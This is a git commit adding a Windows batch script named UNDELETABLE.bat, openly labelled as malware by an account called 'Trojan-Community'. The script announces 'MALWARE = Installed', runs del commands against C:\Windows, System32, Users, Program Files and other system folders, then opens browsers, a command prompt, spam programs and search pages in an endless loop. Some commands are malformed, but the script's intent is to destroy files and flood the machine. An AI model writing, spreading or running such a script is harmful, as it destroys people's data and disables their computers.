33b52809d02abfdb139c07f1b119c9402e427be1
Trojan-Community <93414769+TrojanHorse-Communtiy@users.noreply.github.com>
2022-05-05 11:46:39 +1000

    Create UNDELETABLE.bat

---
+++ UNDELETABLE.bat
@@ -0,0 +1,35 @@
+@echo off
+cls
+goto main
+
+:main
+cls
+color c0
+echo =======================================================
+echo 𝙈𝘼𝙇𝙒𝘼𝙍𝙀 = Installed
+echo =======================================================
+ping localhost -n 2 >nul
+del C:\Windows
+del C:\Temp
+del C:\Users
+del C:\Drivers
+del C:\Windows\System32
+del C:\Program Files
+del C:\Program Files (x86)
+del C:\Windows\Boot
+delete C:\Windows
+delete C:\Users
+delete C:\Program Files (x86)
+delete C:\Program Files
+delete C:\Drivers
+start www.google.com
+start www.gmail.com
+start www.yahoo.com
+start cmd
+start SpamPop
+start https://www.google.com/search?q=free+virus+download&sxsrf=ALiCzsYp316s_Vw_CxOIAYhThbMnAYWTtw%3A1651714796904&source=hp&ei=7CpzYrL-NPLFz7sPiMuH8Ao&iflsig=AJiK0e8AAAAAYnM4_AsFIUpnta1rGMwsGK7NDppwInox&ved=0ahUKEwiypPONncf3AhXy4nMBHYjlAa4Q4dUDCAk&uact=5&oq=free+virus+download&gs_lcp=Cgdnd3Mtd2l6EAMyBQgAEMQCMgUIABCABDIFCAAQgAQyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEMgYIABAWEB4yBggAEBYQHjIGCAAQFhAeOgQIIxAnOhEILhCABBCxAxCDARDHARDRAzoRCC4QgAQQsQMQgwEQxwEQowI6CAgAELEDEIMBOg4ILhCABBCxAxDHARCjAjoLCAAQgAQQsQMQgwE6CwguEIAEEMcBEKMCOggIABCABBCxAzoLCC4QgAQQsQMQgwE6CAguELEDEIMBOggILhCABBCxAzoLCC4QsQMQgwEQ1AI6BQguEIAEOgsILhCABBCxAxDUAjoFCAAQsQM6BwgAEIAEEApQAFjwHmDvI2gAcAB4AIABtQKIAa0dkgEIMC4xMS43LjGYAQCgAQE&sclient=gws-wiz
+start https://www.google.com/search?q=how+2+get+a+free+vpn&sxsrf=ALiCzsY4SXxDed6NjjNG2O8rICrl9BMWDQ%3A1651714854900&ei=JitzYojMNp2V4-EP9dO3mAY&ved=0ahUKEwiI98ipncf3AhWdyjgGHfXpDWMQ4dUDCA4&uact=5&oq=how+2+get+a+free+vpn&gs_lcp=Cgdnd3Mtd2l6EAMyBwgAEEcQsAMyBwgAEEcQsAMyBwgAEEcQsAMyBwgAEEcQsAMyBwgAEEcQsAMyBwgAEEcQsAMyBwgAEEcQsAMyBwgAEEcQsANKBQg8EgExSgQIQRgASgQIRhgAUABYAGCXBGgBcAF4AIABAIgBAJIBAJgBAMgBCMABAQ&sclient=gws-wiz
+start WinWarn
+start WinWarn2
+start SpamSpamSpam
+goto main
